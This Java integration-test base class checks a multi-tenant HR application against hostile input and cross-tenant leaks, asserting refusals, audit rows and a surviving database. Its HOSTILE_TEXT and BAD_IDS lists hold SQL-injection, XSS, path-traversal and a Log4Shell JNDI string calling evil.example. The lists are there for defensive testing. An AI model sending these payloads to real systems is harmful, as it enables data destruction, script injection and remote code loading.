package com.jurislpo.jurisone.security;

import static org.assertj.core.api.Assertions.assertThat;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.jurislpo.jurisone.IntegrationTest;
import com.jurislpo.jurisone.SignIn;
import com.jurislpo.jurisone.TestData;
import jakarta.servlet.http.Cookie;
import java.util.List;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;
import org.junit.jupiter.api.BeforeEach;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;

/**
 * Shared set-up and checks for the hostile-input and cross-tenant sweeps: two businesses (alpha is the one attacked from, beta holds data
 * marked {@link #BETA_MARKER}), people with a wide role and a plain employee role in each, and one way to say "this must be refused with a
 * problem-details body that leaks nothing".
 */
public abstract class HostileInputTestBase extends IntegrationTest {

    /** Text planted in the other business's data: if it ever shows up in an alpha response, tenants leaked. */
    public static final String BETA_MARKER = "BETASECRET";

    public static final List<String> WIDE_PERMISSIONS = List.of("self", "dir", "att.all", "appr.leave", "appr.reg", "people.view", "people.add", "access.toggle", "dept.manage", "holidays.manage",
            "pay.view", "struct.manage", "tax.view", "proofs.verify", "policies.manage", "assets.manage", "announcements.manage", "letters.manage", "roles.manage");

    /** Strings an attacker sends in text fields, filters and ids. */
    public static final List<String> HOSTILE_TEXT = List.of("' OR '1'='1", "'; DROP TABLE employees; --", "1; SELECT pg_sleep(10)--", "\" OR \"\"=\"", "%27%20OR%201=1",
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "${jndi:ldap://evil.example/a}", "{{7*7}}", "../../../../etc/passwd", "a\u0000b", "\\u0027 OR 1=1 --");

    /** Things that are not ids. */
    public static final List<String> BAD_IDS = List.of("not-a-uuid", "00000000-0000-0000-0000-000000000000", "1' OR '1'='1", "<script>", "%00", "0".repeat(300), "-1", "null");

    @Autowired protected MockMvc mockMvc;
    @Autowired protected JdbcTemplate jdbc;
    @Autowired protected ObjectMapper json;

    protected TestData alpha, beta;
    protected UUID alphaWideRole, alphaPlainRole, betaWideRole, betaPlainRole;
    protected Person alphaWide, alphaPlain, alphaPlainOther, betaWide, betaPlain;

    public record Person(UUID id, String email, Cookie cookie) {}

    /** One request: method, path (with the id already in it), JSON body (null = none). */
    public record Call(String method, String path, String body) {
        public Call(String method, String path) {
            this(method, path, null);
        }

        @Override
        public String toString() {
            return method + " " + (path.length() > 90 ? path.substring(0, 90) + "…" : path) + (body == null ? "" : " " + (body.length() > 60 ? body.substring(0, 60) + "…" : body));
        }

        public boolean isWrite() {
            return !"GET".equals(method);
        }
    }

    @BeforeEach
    void setUpTwoBusinesses() throws Exception {
        alpha = new TestData(jdbc).inBusiness("hostile-alpha");
        beta = new TestData(jdbc).inBusiness("hostile-beta");
        alphaWideRole = alpha.role("sweep-wide", WIDE_PERMISSIONS.toArray(String[]::new));
        alphaPlainRole = alpha.role("sweep-plain", "self", "dir");
        betaWideRole = beta.role("sweep-wide", WIDE_PERMISSIONS.toArray(String[]::new));
        betaPlainRole = beta.role("sweep-plain", "self", "dir");
        alphaWide = person(alpha, alphaWideRole, "SW");
        alphaPlain = person(alpha, alphaPlainRole, "SP");
        alphaPlainOther = person(alpha, alphaPlainRole, "SO");
        betaWide = person(beta, betaWideRole, BETA_MARKER + "W");
        betaPlain = person(beta, betaPlainRole, BETA_MARKER + "P");
    }

    protected Person person(TestData data, UUID role, String codePrefix) throws Exception {
        String code = codePrefix + java.util.UUID.randomUUID().toString().substring(0, 8);
        String email = code.toLowerCase() + "@sweep.test";
        UUID id = data.employee(code, email, role);
        String set = SignIn.session(mockMvc, email).andReturn().getResponse().getHeader("Set-Cookie");
        Matcher matcher = Pattern.compile("jo_at=([^;]+)").matcher(set);
        assertThat(matcher.find()).as("signed in " + email).isTrue();
        return new Person(id, email, new Cookie("jo_at", matcher.group(1)));
    }

    /** The request as the web app sends it, signed in as {@code person} (null = signed out). */
    protected MockHttpServletRequestBuilder build(Person person, Call call) {
        MockHttpServletRequestBuilder request = MockMvcRequestBuilders.request(HttpMethod.valueOf(call.method()), java.net.URI.create(call.path()))
                .header("origin", "http://localhost:3005").header("host", "localhost:3005");
        if (call.body() != null) request.contentType(MediaType.APPLICATION_JSON).content(call.body());
        if (person != null) request.cookie(person.cookie());
        return request;
    }

    protected MvcResult send(Person person, Call call) throws Exception {
        return mockMvc.perform(build(person, call)).andReturn();
    }

    /** Percent-encodes one path segment or query value. */
    protected static String enc(String value) {
        return java.net.URLEncoder.encode(value, java.nio.charset.StandardCharsets.UTF_8).replace("+", "%20");
    }

    private static final List<String> LEAK_MARKERS = List.of("Exception", "org.springframework", "com.jurislpo", "org.postgresql", "PSQLException", "SQLState", "syntax error", "ERROR:",
            "java.lang", "at java.", "\tat ", "Hibernate", "jdbc:", "Traceback", "stackTrace");

    protected void assertNoLeak(String body) {
        for (String marker : LEAK_MARKERS) assertThat(body).as("response must not reveal internals (" + marker + ")").doesNotContain(marker);
    }

    /** A refusal: one of {@code statuses}, a problem-details body that leaks nothing; a write also leaves a matching audit row. */
    protected JsonNode assertRefused(Person person, Call call, MvcResult result, int... allowedStatuses) throws Exception {
        int[] statuses = allowedStatuses;
        int status = result.getResponse().getStatus();
        boolean legacy = JsonAuthEntryPoint.isLegacyRoute(call.path()); // the original routes answer 403 (not 401) when signed out and a plain-text 404 (documented, see the report)
        if (legacy && person == null && status == 403) statuses = java.util.stream.IntStream.concat(java.util.Arrays.stream(statuses), java.util.stream.IntStream.of(403)).toArray();
        if (legacy && status == 404 && !String.valueOf(result.getResponse().getContentType()).startsWith("application/problem+json")) {
            assertNoLeak(result.getResponse().getContentAsString());
            return null;
        }
        assertThat(IntStreamOf(statuses)).as(call + " as " + (person == null ? "nobody" : person.email()) + " answered " + status + ": " + result.getResponse().getContentAsString()).contains(status);
        String body = result.getResponse().getContentAsString();
        assertThat(result.getResponse().getContentType()).as("content type of " + call).startsWith("application/problem+json");
        JsonNode problem = json.readTree(body);
        assertThat(problem.path("status").asInt()).isEqualTo(status);
        assertThat(problem.path("detail").asText()).as("detail of " + call).isNotBlank();
        assertThat(problem.path("code").asText()).as("code of " + call).isNotBlank();
        assertNoLeak(body);
        assertThat(body).doesNotContain(BETA_MARKER);
        if (call.isWrite() && !call.path().equals("/api/v1/audit/page-views")) assertAudited(person, call, result, status); // page views write their own row
        return problem;
    }

    protected void assertRefused(Person person, Call call, int... statuses) throws Exception {
        assertRefused(person, call, send(person, call), statuses);
    }

    private static List<Integer> IntStreamOf(int[] values) {
        return java.util.Arrays.stream(values).boxed().toList();
    }

    /** The write left one audit row: same request id, method, status, and the actor when someone was signed in. */
    protected void assertAudited(Person person, Call call, MvcResult result, int status) {
        String requestId = result.getResponse().getHeader(AuditTrail.REQUEST_ID_HEADER);
        assertThat(requestId).as("X-Request-Id of " + call).isNotBlank();
        List<java.util.Map<String, Object>> rows = jdbc.queryForList("SELECT actor_id, method, status, business_id FROM audit_log WHERE request_id = ?", requestId);
        assertThat(rows).as("audit row of refused " + call).hasSize(1);
        assertThat(rows.get(0).get("method")).isEqualTo(call.method());
        assertThat(rows.get(0).get("status")).isEqualTo(status);
        if (person != null) assertThat(rows.get(0).get("actor_id")).isEqualTo(person.id());
    }

    /** Whatever the answer, the server must not fail (5xx), leak internals, or show the other business's data to {@code person}. */
    protected MvcResult assertSurvives(Person person, Call call) throws Exception {
        MvcResult result = send(person, call);
        int status = result.getResponse().getStatus();
        String body = result.getResponse().getContentAsString();
        assertThat(status).as(call + " -> " + status + " " + body).isLessThan(500);
        boolean urlFirewall = status == 400 && body.isEmpty(); // StrictHttpFirewall turns away ; %25 %00 and the like with no body
        boolean legacyNotFound = status == 404 && JsonAuthEntryPoint.isLegacyRoute(call.path());
        if (status >= 400 && !urlFirewall && !legacyNotFound) {
            assertThat(result.getResponse().getContentType()).as("content type of " + call).startsWith("application/problem+json");
            assertNoLeak(body);
        }
        if (person != null && person.id() != null) assertThat(body).as("tenant leak in " + call).doesNotContain(BETA_MARKER);
        return result;
    }

    /** The employees table is still there with its rows (nothing a hostile string did dropped or emptied it). */
    protected void assertDatabaseIntact() {
        assertThat(jdbc.queryForObject("SELECT count(*) FROM employees", Long.class)).isGreaterThan(0);
        assertThat(jdbc.queryForObject("SELECT count(*) FROM businesses", Long.class)).isGreaterThan(1);
    }

    protected Stream<String> hostileText() {
        return HOSTILE_TEXT.stream();
    }

    protected static String quote(String text) {
        return new ObjectMapper().valueToTree(text).toString();
    }
}
